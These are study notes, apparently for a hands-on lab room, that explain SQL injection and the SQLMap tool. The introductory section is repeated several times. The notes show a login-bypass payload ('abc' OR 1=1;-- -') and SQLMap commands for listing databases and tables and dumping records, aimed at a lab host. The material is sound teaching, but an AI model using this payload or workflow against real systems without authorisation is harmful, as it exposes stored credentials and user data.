# SQL Injection – Basics

## What is a Database?

A **database** is a collection of data that can be:

* Stored
* Modified
* Retrieved

Websites use databases to store information such as:

* User accounts
* Credentials
* Products
* Search results
* Other application data

## How Websites Interact With Databases

Websites often contain **input fields** where users enter information.

For example, a login page asks for a username and password. The website sends this information to the database to check whether the credentials are correct.

### Login Example

```text
User enters username + password
            ↓
Website sends SQL query
            ↓
Database checks stored data
            ↓
Result is returned
            ↓
User is logged in or rejected
```

A search box works in a similar way:

```text
User searches for a book
          ↓
Website sends SQL query
          ↓
Database finds matching record
          ↓
Website displays the result
```

## DBMS

A **Database Management System (DBMS)** is software used to manage databases.

Examples include:

* **MySQL**
* **PostgreSQL**
* **SQLite**
* **Microsoft SQL Server**

## SQL

**SQL (Structured Query Language)** is the language used by applications and websites to communicate with databases.

SQL can be used to:

* Retrieve data
* Store data
* Modify data
* Delete data

## What is SQL Injection?

**SQL Injection (SQLi)** is a vulnerability that occurs when an application incorrectly includes user input in an SQL query.

An attacker may be able to manipulate the input so that the SQL query behaves differently from what the developer intended.

### Basic idea

```text
Normal input
     ↓
Website creates SQL query
     ↓
Database executes query

Malicious input
     ↓
Website creates unsafe SQL query
     ↓
Query is altered
     ↓
Database may perform unintended actions
```

## SQLMap

**SQLMap** is an automated tool used to detect and exploit SQL injection vulnerabilities.

It can automate many SQL injection testing tasks.

## Room Learning Objectives

This room covers:

1. **SQL injection vulnerabilities**
2. **Using SQLMap to find SQL injection**
3. **Hands-on SQL injection testing**

## Prerequisites

Having knowledge of **SQL fundamentals** is helpful, but it is **not required** to complete the room.

## Easy Memory

> **Database** = stores the data
> **DBMS** = manages the database
> **SQL** = communicates with the database
> **SQL Injection** = manipulating an unsafe SQL query
> **SQLMap** = automates SQL injection testing

# SQL Injection – Basics

## What is a Database?

A **database** is a collection of data that can be:

* Stored
* Modified
* Retrieved

Websites use databases to store information such as:

* User accounts
* Credentials
* Products
* Search results
* Other application data

## How Websites Interact With Databases

Websites often contain **input fields** where users enter information.

For example, a login page asks for a username and password. The website sends this information to the database to check whether the credentials are correct.

### Login Example

```text
User enters username + password
            ↓
Website creates SQL query
            ↓
Database checks stored data
            ↓
Result is returned
            ↓
User is logged in or rejected
```

## DBMS

A **Database Management System (DBMS)** is software used to manage databases.

Examples include:

* **MySQL**
* **PostgreSQL**
* **SQLite**
* **Microsoft SQL Server**

## SQL

**SQL (Structured Query Language)** is the language used by applications and websites to communicate with databases.

SQL can be used to:

* Retrieve data
* Store data
* Modify data
* Delete data

---

# SQL Injection

## What is SQL Injection?

**SQL Injection (SQLi)** is a vulnerability that occurs when an application incorrectly includes user input in an SQL query.

If input is not properly **validated or sanitised**, an attacker may be able to change the meaning of the SQL query.

> Only test for SQL injection when you have permission from the application owner.

## Normal Login Query

Suppose a user enters:

```text
Username: John
Password: Un@detectable444
```

The application might create:

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

The database checks whether **both** conditions are true:

* Username = `John`
* Password = `Un@detectable444`

The `AND` operator means both conditions must be true.

---

## SQL Injection Example

Suppose the application does not properly validate the password input.

An attacker enters:

```text
Username: John
Password: abc' OR 1=1;-- -
```

The application may create:

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

The query has now been changed.

### What happened?

The original password condition is:

```sql
password = 'abc'
```

Then the injected input adds:

```sql
OR 1=1
```

Since:

```text
1 = 1
```

is always **true**, the `OR` condition can make the overall condition true.

### Why is the single quote important?

The `'` after `abc` closes the original password string:

```sql
password = 'abc'
```

This allows the attacker to introduce a new SQL condition:

```sql
OR 1=1
```

Without the quote, the injected text could remain inside the original password value instead of becoming part of the SQL query.

### What does `-- -` do?

`-- -` is used as an **SQL comment** in this example.

It causes the remainder of the original query to be ignored.

So the application-generated ending:

```sql
';
```

is effectively commented out.

---

## Why `OR 1=1` Works

The logic is:

```text
Username is John
        AND
Password is abc
        OR
1 = 1
```

The password condition is false, but:

```text
1 = 1 → TRUE
```

So the `OR` condition can make the expression evaluate as true.

## Important Concepts

| Concept              | Meaning                                        |
| -------------------- | ---------------------------------------------- |
| **Input validation** | Checking that user input is acceptable         |
| **Sanitisation**     | Handling input safely before using it          |
| **AND**              | Both conditions must be true                   |
| **OR**               | At least one condition must be true            |
| **`'`**              | Can close a quoted SQL string                  |
| **`1=1`**            | A condition that is always true                |
| **`-- -`**           | Comments out the remaining SQL in this example |

## Basic SQL Injection Flow

```text
User input
    ↓
Application inserts input into SQL query
    ↓
Unsafe input changes the query
    ↓
Database executes modified query
    ↓
Application may return unintended results
```

## Key Point

SQL injection happens when **untrusted user input becomes part of an SQL query in an unsafe way**.

A successful SQL injection can potentially expose or modify sensitive database information.

# SQL Injection – Basics

## What is a Database?

A **database** is a collection of data that can be:

* Stored
* Modified
* Retrieved

Websites use databases to store information such as:

* User accounts
* Credentials
* Products
* Search results
* Other application data

## How Websites Interact With Databases

Websites often contain **input fields** where users enter information.

For example, a login page asks for a username and password. The website sends this information to the database to check whether the credentials are correct.

### Login Example

```text
User enters username + password
            ↓
Website creates SQL query
            ↓
Database checks stored data
            ↓
Result is returned
            ↓
User is logged in or rejected
```

## DBMS

A **Database Management System (DBMS)** is software used to manage databases.

Examples include:

* **MySQL**
* **PostgreSQL**
* **SQLite**
* **Microsoft SQL Server**

## SQL

**SQL (Structured Query Language)** is the language used by applications and websites to communicate with databases.

SQL can be used to:

* Retrieve data
* Store data
* Modify data
* Delete data

---

# SQL Injection

## What is SQL Injection?

**SQL Injection (SQLi)** is a vulnerability that occurs when an application incorrectly includes user input in an SQL query.

If input is not properly **validated or sanitised**, an attacker may be able to change the meaning of the SQL query.

> Only test for SQL injection when you have permission from the application owner.

## Normal Login Query

Suppose a user enters:

```text
Username: John
Password: Un@detectable444
```

The application might create:

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

The database checks whether **both** conditions are true.

The `AND` operator means both conditions must be true.

## SQL Injection Example

Suppose the application does not properly validate the password input.

An attacker enters:

```text
Username: John
Password: abc' OR 1=1;-- -
```

The application may create:

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

### What happened?

The `'` closes the original password string:

```sql
password = 'abc'
```

The injected input then adds:

```sql
OR 1=1
```

Since `1=1` is always true, the query may return a successful result.

The `-- -` comments out the remaining part of the SQL query.

## Important Concepts

| Concept              | Meaning                                   |
| -------------------- | ----------------------------------------- |
| **Input validation** | Checking whether user input is acceptable |
| **Sanitisation**     | Handling input safely before using it     |
| **AND**              | Both conditions must be true              |
| **OR**               | At least one condition must be true       |
| **`'`**              | Can close a quoted SQL string             |
| **`1=1`**            | A condition that is always true           |
| **`-- -`**           | SQL comment syntax used in this example   |

---

# SQLMap

## What is SQLMap?

**SQLMap** is an automated tool used to **detect and exploit SQL injection vulnerabilities** in web applications.

It can automate many SQL injection testing and database enumeration tasks.

## SQLMap Help

To view available options:

```bash
sqlmap --help
```

## SQLMap Wizard

For beginners, SQLMap has an interactive wizard:

```bash
sqlmap --wizard
```

The wizard asks questions and guides you through the scan.

---

# GET-Based SQL Injection

A website may use parameters in the URL to retrieve information.

Example:

```text
http://sqlmaptesting.thm/search?cat=1
```

Here:

```text
cat=1
```

is a **GET parameter**.

SQLMap can test the URL using:

```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1"
```

### `-u`

Specifies the **target URL**.

## SQL Injection Techniques SQLMap May Detect

SQLMap can identify different types of SQL injection, including:

* **Boolean-based blind**
* **Error-based**
* **Time-based blind**
* **UNION query**

### Boolean-Based Blind

Uses conditions that evaluate to true or false to infer information.

Example:

```sql
1=1
```

### Error-Based

Uses database errors to obtain useful information.

### Time-Based Blind

Uses delays in database responses to infer information.

### UNION Query

Uses SQL `UNION` functionality to retrieve data from additional query results.

---

# Enumerating Databases

The `--dbs` option extracts the available database names.

```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" --dbs
```

Example output:

```text
available databases [2]:
[*] users
[*] members
```

### `--dbs`

> Lists available databases.

---

# Enumerating Tables

After finding a database, use `-D` to specify the database and `--tables` to list its tables.

```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" -D users --tables
```

### Important options

| Option     | Purpose                      |
| ---------- | ---------------------------- |
| `-D`       | Specify a database           |
| `--tables` | List tables in that database |

Example:

```text
Database: users

johnath
alexas
thomas
```

---

# Dumping Table Data

To extract the records from a specific table:

```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" -D users -T thomas --dump
```

### Options

| Option   | Purpose               |
| -------- | --------------------- |
| `-D`     | Specify database      |
| `-T`     | Specify table         |
| `--dump` | Extract table records |

Example:

```text
Database: users
Table: thomas

name       pass
Thomas THM testing
```

> In real applications, dumped data may contain sensitive information such as credentials or password hashes.

---

# Cookie-Based Testing

Some applications require authentication before an injection point can be accessed.

SQLMap can send session cookies using:

```bash
sqlmap -u "http://example.thm/page?id=1" --cookie="SESSIONID=abcdef123456"
```

This allows SQLMap to make requests using the specified authenticated session.

Common session cookie names include:

* `PHPSESSID`
* `JSESSIONID`
* Authentication tokens

---

# POST-Based Testing

Not all parameters appear in the URL.

For example, login and registration forms commonly send data using **HTTP POST** requests.

SQLMap can test a captured POST request saved in a text file:

```bash
sqlmap -r intercepted_request.txt
```

### `-r`

Uses a **saved HTTP request** as the input for SQLMap testing.

```text
Browser
   ↓
POST request
   ↓
Save request to file
   ↓
sqlmap -r intercepted_request.txt
   ↓
SQL injection testing
```

---

# SQLMap Command Summary

| Command / Option  | Purpose                            |
| ----------------- | ---------------------------------- |
| `sqlmap --help`   | Show available options             |
| `sqlmap --wizard` | Interactive beginner-friendly mode |
| `-u`              | Specify target URL                 |
| `--dbs`           | List databases                     |
| `-D`              | Select database                    |
| `--tables`        | List tables                        |
| `-T`              | Select table                       |
| `--dump`          | Extract table data                 |
| `--cookie`        | Include session cookies            |
| `-r`              | Test a saved HTTP request          |

## SQLMap Workflow

```text
Find possible injection point
          ↓
Test URL/request with SQLMap
          ↓
Identify SQL injection
          ↓
List databases
    (--dbs)
          ↓
Select database
    (-D)
          ↓
List tables
    (--tables)
          ↓
Select table
    (-T)
          ↓
Dump records
    (--dump)
```

## Key Point

**SQLMap automates SQL injection testing and database enumeration.**

The basic progression to remember is:

> **URL/request → detect SQLi → databases → tables → records**
